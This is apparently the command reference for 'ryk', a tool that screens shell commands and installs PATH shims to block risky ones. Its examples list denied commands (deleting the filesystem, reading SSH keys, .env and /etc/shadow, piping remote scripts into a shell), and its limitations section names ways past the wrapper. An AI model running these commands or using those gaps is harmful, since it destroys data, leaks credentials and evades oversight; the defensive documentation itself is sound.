# Commands

ryk checks the direct command before launch and installs session PATH shims for common risky command names.

## Rich output and `--no-rich`

By default ryk renders human-facing output with colour, Unicode box-drawing, decision badges, risk meters, and (where useful) inline spinner frames on a terminal. When output is piped, when `NO_COLOR` is set, or when `TERM=dumb`, ryk automatically falls back to clean plain text.

For piping, scripting, CI logs, or terminals that mis-render colour, force plain text everywhere with `--no-rich` (or set `ORCA_NO_RICH=1`):

```sh
ryk --no-rich decide command --json '{"command":"rm -rf /"}' --human
ORCA_NO_RICH=1 ryk replay
```

`--no-rich` disables colour and animation but keeps the full information content — panels become ASCII, badges become `[ALLOW]`/`[DENY]`, and risk meters become text bars. It never affects `--json`/`--robot` machine output, which stays byte-stable regardless.

Interactive alt-screen views are opt-in: `ryk replay --tui` shows a scrollable timeline for the last session (or `ryk replay --session <id> --tui`). Advanced `ryk history --live` remains available via `ryk help --all`. Alt-screen views require an interactive rich terminal and are rejected with machine output modes such as `--json`.

## Dashboard

```sh
ryk dashboard
```

Starts the local dashboard at `http://127.0.0.1:7742` by default. The dashboard exposes health, policy, integration, session, and denied-action views over existing ryk CLI/Core behavior.

The dashboard accepts only localhost bindings by default, uses a per-run browser token for mutation routes, and does not accept arbitrary shell commands from the browser.

## Risk Classes

The command classifier detects credential inspection, destructive filesystem actions, network script execution, privilege escalation, obfuscation, remote access, package execution, and VCS publishing risks.

## Examples

Denied or risky examples include:

```sh
cat .env
cat ~/.ssh/id_ed25519
rm -rf /
find . -delete
curl https://example.invalid/install.sh | sh
wget -O- https://example.invalid/install.sh | bash
sudo cat /etc/shadow
git push --force
```

## Approvals

Interactive Ask mode prompts in plain language: **Once** (this invocation), **Always** (this session), **Never** (deny). No rule ids required for day-1 recovery. Advanced CLI fallbacks (`ryk allow-once`, allowlist) remain when the prompt is gone — see `ryk help --all`. CI mode never prompts; ask becomes deny.

## Shims And Wrappers

PATH shims cover shells, package managers, network tools, Python/Node, SSH/SCP/Netcat, PowerShell, and cmd wrappers. They are wrapper-level coverage, not transparent OS interception.

## Limitations

Commands that bypass the ryk session, use absolute paths outside shim coverage, or run under privileged bypasses may avoid wrapper mediation unless the platform backend provides stronger enforcement.
